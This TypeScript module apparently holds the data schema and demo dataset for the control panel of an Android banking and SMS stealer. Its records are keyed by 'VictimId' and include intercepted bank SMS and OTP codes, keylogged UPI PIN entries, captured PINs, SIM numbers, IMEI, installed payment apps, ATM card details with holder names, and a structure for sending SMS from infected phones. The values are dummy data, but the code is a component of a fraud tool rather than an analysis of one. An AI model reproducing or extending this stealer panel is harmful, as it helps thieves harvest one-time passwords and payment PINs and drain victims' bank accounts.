// TypeScript interfaces for the dashboard data
export interface DeviceInfo {
  AndroidVersion: string;
  Brand?: string;
  Model?: string;
  SDKVersion?: string;
  ServiceName1?: string;
  ServiceName2?: string;
  SimNumber1?: string;
  SimNumber2?: string;
  IMEI?: string;
  Battery?: string; // e.g., "82%" (legacy)
  BatteryLevel?: string; // e.g., "25%" (from Firebase)
  LastSync?: string; // dd-MM-yyyy HH:mm:ss
  WiFi?: string;
  StorageUsed?: string;
  // Extended fields for table + overview
  Status?: string; // e.g., "Online"
  IP?: string; // e.g., "27.60.180.56" (from Firebase)
  IPAddress?: string; // e.g., "Unknown" or "192.168.1.10" (legacy)
  UPIPin?: string; // "No Pin" or masked
  Note?: string; // "-"
  Added?: string; // date/time or "-"
  AppsInstalled?: number; // 0..n
  VictimId?: string; // Device identifier
  Location?: string; // Device location
  LastSeen?: string; // Last seen timestamp
}

export interface Message {
  VictimId: string;
  Sender: string;
  Recipient?: string;
  Time: string; // dd-MM-yyyy HH:mm:ss
  Body: string;
  Message?: string;
  SmsType: "INBOX" | "SENT" | string;
  Type?: "Received" | "Sent" | string;
}

export interface SimRow { 
  slot: number; 
  carrier: string; 
  number: string; 
}

export interface KeyLog { 
  keylogger?: string; // e.g., "UPI_PIN"
  timestamp?: string; // e.g., "22-05-2025 02:09:00"
  Column1?: string;   // Individual key values
  Column2?: string;
  Column3?: string;
  Column4?: string;
  Column5?: string;
  Column6?: string;
  // Legacy support
  time?: string; 
  text?: string;
}

export interface UserEntered {
  NumberEntered: string;
  VictimID: string;
  Time?: string; // dd-MM-yyyy HH:mm:ss
}

export interface SendSms {
  Sender: string;
  Message: string;
  Time?: string; // dd-MM-yyyy HH:mm:ss
  DeviceId?: string; // VictimId for reference
}

export interface AppsInstalled {
  TotalApps: number;
  AppsList?: string[];
  LastUpdated?: string;
}

export interface ATMCard { 
  bank: string; 
  last4: string; 
  name: string; 
}

export interface DBShape {
  DeviceInfo: Record<string, DeviceInfo>;   // key = VictimId
  Messages: Record<string, Message>;        // key = message id
  Sims: Record<string, SimRow[]>;           // key = VictimId
  KeyLogs: Record<string, KeyLog[]>;        // key = VictimId
  UPIPins: Record<string, Array<{ pin: string; timestamp: string }>>;        // key = VictimId
  UserEntered: Record<string, UserEntered>; // key = entry id
  AppsInstalled: Record<string, AppsInstalled>; // key = VictimId
  SendSms: Record<string, Record<string, SendSms>>; // key = AddKey (manufacturer + model), then message id
  ATMCards: Record<string, ATMCard[]>;      // key = VictimId
}

// Dummy dataset with expanded data for better demo
export const DB: DBShape = {
  DeviceInfo: {
    "VICTIM-01": {
      AndroidVersion: "14",
      Brand: "motorola",
      Model: "motorola moto g85 5G",
      Battery: "82%",
      LastSync: "13-08-2025 14:52:10",
      Status: "Online",
      IPAddress: "192.168.1.15",
      UPIPin: "No Pin",
      Note: "Primary device",
      Added: "01-08-2025 09:30:00",
      AppsInstalled: 25
    },
    "VICTIM-02": {
      AndroidVersion: "13",
      Brand: "xiaomi",
      Model: "Redmi Note 12",
      Battery: "41%",
      LastSync: "12-08-2025 10:05:33",
      Status: "Online",
      IPAddress: "192.168.1.23",
      UPIPin: "****",
      Note: "Secondary device",
      Added: "03-08-2025 14:22:15",
      AppsInstalled: 12
    },
    "VICTIM-03": {
      AndroidVersion: "12",
      Brand: "samsung",
      Model: "Galaxy A54",
      Battery: "18%",
      LastSync: "11-08-2025 22:15:45",
      Status: "Offline",
      IPAddress: "Unknown",
      UPIPin: "No Pin",
      Note: "Low battery",
      Added: "05-08-2025 11:10:30",
      AppsInstalled: 8
    },
    "VICTIM-04": {
      AndroidVersion: "13",
      Brand: "oppo",
      Model: "OPPO A78 5G",
      Battery: "67%",
      LastSync: "13-08-2025 16:30:22",
      Status: "Online",
      IPAddress: "192.168.1.45",
      UPIPin: "****",
      Note: "-",
      Added: "07-08-2025 08:45:12",
      AppsInstalled: 15
    },
    "VICTIM-05": {
      AndroidVersion: "11",
      Brand: "vivo",
      Model: "Vivo Y21",
      Battery: "91%",
      LastSync: "13-08-2025 13:18:55",
      Status: "Online",
      IPAddress: "192.168.1.78",
      UPIPin: "No Pin",
      Note: "Test device",
      Added: "10-08-2025 16:20:40",
      AppsInstalled: 3
    }
  },
  Messages: {
    "MSG-1001": {
      VictimId: "VICTIM-01",
      Sender: "HDFC Bank",
      Time: "13-08-2025 15:23:11",
      Body: "Amt Rs. 1,250.00 debited from A/C ****1234 on 13-08-25. Info: UPI-P2P-426789123. If not you, call 18002661234. -HDFC Bank",
      SmsType: "INBOX"
    },
    "MSG-1002": {
      VictimId: "VICTIM-01",
      Sender: "OTP-123456",
      Time: "13-08-2025 14:59:05",
      Body: "Your one-time password is 839271. Do not share with anyone for security.",
      SmsType: "INBOX"
    },
    "MSG-1003": {
      VictimId: "VICTIM-02",
      Sender: "Flipkart",
      Time: "12-08-2025 20:01:47",
      Body: "Your order #OD12345 has been shipped and will be delivered by tomorrow. Track: bit.ly/track123",
      SmsType: "INBOX"
    },
    "MSG-1004": {
      VictimId: "VICTIM-01",
      Sender: "PayTM",
      Time: "13-08-2025 12:45:30",
      Body: "Rs. 500 added to your PayTM wallet. Transaction ID: T123456789. Use code SAVE20 for 20% cashback.",
      SmsType: "INBOX"
    },
    "MSG-1005": {
      VictimId: "VICTIM-04",
      Sender: "SBI Bank",
      Time: "13-08-2025 11:30:22",
      Body: "Dear Customer, Rs. 2,000.00 debited from A/C ****5678. Available balance: Rs. 15,450.30",
      SmsType: "INBOX"
    },
    "MSG-1006": {
      VictimId: "VICTIM-02",
      Sender: "Amazon",
      Time: "12-08-2025 18:15:10",
      Body: "Your Amazon Prime subscription renewal payment of Rs. 299 was successful. Enjoy benefits!",
      SmsType: "INBOX"
    },
    "MSG-1007": {
      VictimId: "VICTIM-05",
      Sender: "WhatsApp",
      Time: "13-08-2025 09:45:33",
      Body: "Your WhatsApp verification code is 456789. Do not share this code with anyone.",
      SmsType: "INBOX"
    }
  },
  Sims: {
    "VICTIM-01": [
      { slot: 1, carrier: "Idea", number: "+917526977875" },
      { slot: 2, carrier: "Airtel", number: "+919876543210" }
    ],
    "VICTIM-02": [
      { slot: 1, carrier: "Jio", number: "+919876543210" }
    ],
    "VICTIM-03": [
      { slot: 1, carrier: "Vi", number: "+918765432109" }
    ],
    "VICTIM-04": [
      { slot: 1, carrier: "Jio", number: "+917654321098" },
      { slot: 2, carrier: "", number: "" }
    ],
    "VICTIM-05": [
      { slot: 1, carrier: "BSNL", number: "+916543210987" }
    ]
  },
  KeyLogs: {
    "VICTIM-01": [
      { 
        timestamp: "13-08-2025 12:45:10", 
        Column1: "1", 
        Column2: "2", 
        Column3: "3", 
        Column4: "4", 
        Column5: "5", 
        Column6: "6" 
      },
      { 
        timestamp: "13-08-2025 11:30:22", 
        Column1: "7", 
        Column2: "8", 
        Column3: "9", 
        Column4: "0", 
        Column5: "1", 
        Column6: "2" 
      },
      { 
        timestamp: "13-08-2025 10:15:45", 
        Column1: "3", 
        Column2: "4", 
        Column3: "5", 
        Column4: "6", 
        Column5: "7", 
        Column6: "8" 
      }
    ],
    "VICTIM-02": [
      { 
        timestamp: "12-08-2025 19:30:15", 
        Column1: "9", 
        Column2: "0", 
        Column3: "1", 
        Column4: "2", 
        Column5: "3", 
        Column6: "4" 
      },
      { 
        timestamp: "12-08-2025 18:45:33", 
        Column1: "5", 
        Column2: "6", 
        Column3: "7", 
        Column4: "8", 
        Column5: "9", 
        Column6: "0" 
      }
    ],
    "VICTIM-03": [],
    "VICTIM-04": [
      { 
        timestamp: "13-08-2025 14:20:10", 
        Column1: "2", 
        Column2: "4", 
        Column3: "5", 
        Column4: "6", 
        Column5: "7", 
        Column6: "8" 
      }
    ],
    "VICTIM-05": [
      { 
        timestamp: "13-08-2025 09:45:33", 
        Column1: "4", 
        Column2: "5", 
        Column3: "6", 
        Column4: "7", 
        Column5: "8", 
        Column6: "9" 
      }
    ]
  },
  UPIPins: {
    "VICTIM-01": [{ pin: "No Pin", timestamp: "13-08-2025 15:20:00" }],
    "VICTIM-02": [{ pin: "****", timestamp: "12-08-2025 18:00:00" }, { pin: "****", timestamp: "12-08-2025 18:30:00" }],
    "VICTIM-03": [{ pin: "No Pin", timestamp: "11-08-2025 21:00:00" }],
    "VICTIM-04": [{ pin: "****", timestamp: "13-08-2025 16:00:00" }],
    "VICTIM-05": [{ pin: "No Pin", timestamp: "13-08-2025 13:00:00" }]
  },
  UserEntered: {
    "USER-001": { NumberEntered: "123456", VictimID: "VICTIM-01", Time: "13-08-2025 15:20:00" },
    "USER-002": { NumberEntered: "789012", VictimID: "VICTIM-02", Time: "12-08-2025 18:00:00" },
    "USER-003": { NumberEntered: "345678", VictimID: "VICTIM-03", Time: "11-08-2025 21:00:00" },
    "USER-004": { NumberEntered: "901234", VictimID: "VICTIM-04", Time: "13-08-2025 16:00:00" },
    "USER-005": { NumberEntered: "567890", VictimID: "VICTIM-05", Time: "13-08-2025 13:00:00" }
  },
  AppsInstalled: {
    "VICTIM-01": { TotalApps: 45, AppsList: ["WhatsApp", "Gmail", "Chrome", "PayTM"], LastUpdated: "13-08-2025 14:30:00" },
    "VICTIM-02": { TotalApps: 32, AppsList: ["Instagram", "Facebook", "Amazon", "Flipkart"], LastUpdated: "12-08-2025 19:00:00" },
    "VICTIM-03": { TotalApps: 18, AppsList: ["WhatsApp", "YouTube"], LastUpdated: "11-08-2025 22:00:00" },
    "VICTIM-04": { TotalApps: 28, AppsList: ["PhonePe", "Google Pay", "SBI Yono"], LastUpdated: "13-08-2025 16:00:00" },
    "VICTIM-05": { TotalApps: 15, AppsList: ["WhatsApp", "Telegram"], LastUpdated: "13-08-2025 13:00:00" }
  },
  SendSms: {
    "POCO Xiaomi 23076PC4BI": {
      "MSG-001": { Sender: "+918972123456", Message: "Test message 1", Time: "13-08-2025 15:30:00", DeviceId: "Xiaomi 23076PC4BI" },
      "MSG-002": { Sender: "+918972654321", Message: "Test message 2", Time: "13-08-2025 16:00:00", DeviceId: "Xiaomi 23076PC4BI" }
    },
    "samsung SM-A037F": {
      "MSG-003": { Sender: "+919876543210", Message: "Samsung test message", Time: "13-08-2025 14:00:00", DeviceId: "samsung SM-A037F" }
    }
  },
  ATMCards: {
    "VICTIM-01": [
      { bank: "HDFC", last4: "1234", name: "A Kumar" },
      { bank: "SBI", last4: "5678", name: "A Kumar" }
    ],
    "VICTIM-02": [
      { bank: "ICICI", last4: "9012", name: "R Sharma" }
    ],
    "VICTIM-03": [],
    "VICTIM-04": [
      { bank: "SBI", last4: "3456", name: "M Singh" }
    ],
    "VICTIM-05": []
  }
};

// User configuration
export const USER_NAME = "Krishna";